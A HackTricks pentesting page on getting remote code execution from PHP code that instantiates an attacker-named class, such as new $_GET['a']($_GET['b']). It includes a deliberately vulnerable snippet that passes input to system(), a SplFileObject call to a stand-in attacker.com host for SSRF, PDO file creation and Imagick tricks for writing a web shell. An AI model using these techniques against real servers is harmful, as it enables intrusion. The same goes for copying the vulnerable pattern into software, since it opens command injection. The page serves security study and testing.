# PHP - RCE abusing object creation: new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Introduction

In the situation where you can create a new arbitrary object like `new $_GET["a"]($_GET["a"])`you might be able to obtain RCE, and [**this writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) exposes different ways to get RCE.

## RCE via Custom Classes or Autoloading

In the construction `new $a($b)`, the **variable `$a` stands for the class name** that the object will be created for, and the variable **`$b` stands for the first argument** that will be passed to the object’s constructor.

If `$a` and `$b` come from GET/POST, they can be **strings or string arrays**. If they come from **JSON** or elsewhere, they **might have other types**, such as object or boolean.

Let’s consider the following example:

```php
class App {
    function __construct ($cmd) {
        system($cmd);
    }
}

# Additionally, in PHP < 8.0 a constructor might be defined using the name of the class
class App2 {
    function App2 ($cmd) {
        system($cmd);
    }
}

# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```

In this code, you can set  `$a`  to  `App`  or  `App2`  and  `$b`  to  `uname -a`. After this, the command  `uname -a`  will be executed.

When there are no such exploitable classes in your application, or you have the class needed in a separate file that isn’t included by the vulnerable code, you may take a look at autoloading functions.

**Autoloading functions** are set by registering callbacks via `spl_autoload_register` or by defining `__autoload`. They are called when an instance of an unknown class is trying to be created.

```php
# An example of an autoloading function
spl_autoload_register(function ($class_name) {
        include './../classes/' . $class_name . '.php';
});

# An example of an autoloading function, works only in PHP < 8.0
function __autoload($class_name) {
        include $class_name . '.php';
};

# Calling spl_autoload_register with no arguments enables the default autoloading function, which includes lowercase($classname) + .php/.inc from include_path
spl_autoload_register();
```

Depending on the PHP version, and the code in the autoloading functions, some ways to get a Remote Code Execution via autoloading might exist.

## RCE via Built-In Classes

When you don’t have custom classes and autoloading, you can rely on **built-in PHP classes only**.

There are from 100 to 200 built-in PHP classes. The number of them depends on the PHP version and the extensions installed. All of built-in classes can be listed via the `get_declared_classes` function, together with the custom classes:

```php
var_dump(get_declared_classes());
```

Classes with useful constructors can be found via [the reflection API](https://www.php.net/manual/en/book.reflection.php).

Displaying constructors and their parameters using the reflation API: [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)\


![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/2.png)

If you control **multiple constructor parameters and can call arbitrary methods** afterwards, there are many ways to get a Remote Code Execution. But if you can pass **only one parameter and don’t have any calls** to the created object, there is **almost nothing**.

I know of only three ways to get something from `new $a($b)`.

### **SSRF + Phar deserialization**

The `SplFileObject` class implements a constructor that allows connection to any local or remote URL:

```
new SplFileObject('http://attacker.com/');
```

This allows SSRF. Additionally, SSRFs in PHP < 8.0 could be turned into deserializations via techniques with the Phar protocol.

### **Exploiting PDOs**

The PDO class has another interesting constructor:

```php
new PDO("sqlite:/tmp/test.txt")
```

The `PDO` constructor accepts DSN strings, allowing us to **connect to any local or remote database** using **installed database extensions**. For example, the SQLite extension can create empty files.

### **SoapClient/SimpleXMLElement XXE**

In PHP ≤ 5.3.22 and ≤ 5.4.12, the constructor of SoapClient was **vulnerable to XXE**. The constructor of SimpleXMLElement was vulnerable to XXE as well, but it required libxml2 < 2.9.

## RCE via Imagick Extension

Checking the **dependencies** of the **project** you are trying to exploit you could find **new classes** that could be **abused to execute commands** creating a new object. In this case, **Imagick** was found to be useful for that purpose.

### VID parser

The VID parser allows to write arbitrary content in an arbitrary path inside the filesystem, which would allow an attacker to write a PHPshell in an accessible folder from the web page and get RCE.

![](<../../../.gitbook/assets/image (157) (3).png>)

#### VID Parser + FIle Upload

When a file is uploaded to PHP it's temporary stored in `/tmp/phpXXXXXX` . The VID parser of Imagick with the **msl** protocol allows to **specify wildcards in the file paths** (so the temporary uploaded file can be easily accessed) and **copy it to any arbitrary location**.\
This is another way to get arbitrary file writing inside the filesystem:

![](<../../../.gitbook/assets/image (159).png>)

### PHP Crash + Brute Force

The [**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) explained another way to get RCE by **uploading files with specific content** and making the **server crash before it deletes** that file and then **bruteforcing the name** of the temporary file until **Imagick executes arbitrary PHP code**.

However, apparently the **crash trick** discovered only **worked in an old version of ImageMagick**.

## References

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
